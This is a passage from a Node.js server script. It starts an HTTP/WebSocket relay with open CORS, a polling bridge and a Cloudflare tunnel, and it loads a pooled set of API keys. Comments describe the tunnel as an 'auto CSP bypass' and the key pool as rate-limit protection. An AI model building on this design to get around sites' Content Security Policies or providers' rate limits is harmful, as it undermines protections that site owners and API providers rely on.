║  ${C.cyan}Other commands: apihelp (full guide), backups (show providers), resethf (reset HuggingFace)${C.yellow}             ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
${C.reset}
`);
    }

    // Load saved data
    DataStore.load();

    // Load AI Memory (persistent learning)
    AIMemory.load();

    // Load API Key Pool (bulk rate limit protection)
    TerminalAI.loadKeyPool();

    // Initialize AI if key provided
    if (CONFIG.AI_KEY) {
        TerminalAI.init(CONFIG.AI_KEY, CONFIG.AI_PROVIDER);
    }

    // Create HTTP server fresh for the resolved port
    const server = http.createServer((req, res) => {
        // Same request handler as before
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

        if (req.method === 'OPTIONS') {
            res.writeHead(200);
            res.end();
            return;
        }

        // Handle HTTP polling bridge for CSP-restricted environments
        if (req.url === '/poll' && req.method === 'GET') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok', queue: [] }));
            return;
        }

        if (req.url === '/send' && req.method === 'POST') {
            let body = '';
            req.on('data', chunk => body += chunk);
            req.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    handleIncomingMessage(data, { type: 'http', res });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ status: 'received' }));
                } catch (e) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Invalid JSON' }));
                }
            });
            return;
        }

        // Health check
        if (req.url === '/health') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'healthy',
                version: CONFIG.VERSION,
                port: CONFIG.PORT,
                cloudflare: CONFIG.CLOUDFLARE_URL || null
            }));
            return;
        }

        res.writeHead(404);
        res.end('Not Found');
    });

    // Start WebSocket server
    createWebSocketServer(server);

    // Start HTTP server with error handling
    server.on('error', async (err) => {
        if (err.code === 'EADDRINUSE') {
            console.log(`\x1b[33m[AutoHealer] ⚠ Port ${CONFIG.PORT} became unavailable, finding new port...\x1b[0m`);
            CONFIG.PORT = await AutoHealer.findAvailablePort(CONFIG.PORT + 1);
            console.log(`\x1b[32m[AutoHealer] ✓ Retrying on port ${CONFIG.PORT}\x1b[0m`);
            server.listen(CONFIG.PORT, '0.0.0.0');
        } else {
            console.error('\x1b[31m[Error] Server error:', err.message, '\x1b[0m');
        }
    });

    server.listen(CONFIG.PORT, '0.0.0.0', async () => {
        log(`Server listening on port ${CONFIG.PORT}`, 'green');
        log(`Local IP: ${localIP}`, 'blue');

        // Start Cloudflare Tunnel (auto CSP bypass)
        let cloudflareUrl = null;
        if (CONFIG.USE_CLOUDFLARE && CONFIG.CLOUDFLARED_PATH) {
            cloudflareUrl = await CloudflareTunnel.start(CONFIG.PORT, CONFIG.CLOUDFLARED_PATH);
        }

        // Generate and display connection instructions
        displayConnectionInstructions(localIP, CONFIG.PORT, CONFIG.AUTH_TOKEN, cloudflareUrl);

        // Start CLI
        CLI.start();
    });
}

// Handle shutdown
process.on('SIGINT', () => {
    log('\nSaving data and shutting down...', 'yellow');
    CloudflareTunnel.stop();
    DataStore.save();
    AIMemory.save();  // Save AI learning data
    log('✅ AI Memory saved', 'green');
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    log(`Uncaught exception: ${error.message}`, 'red');
    console.error(error);
    // Try to save memory on crash
    try { AIMemory.save(); } catch (e) { }
});

// Start
startup();

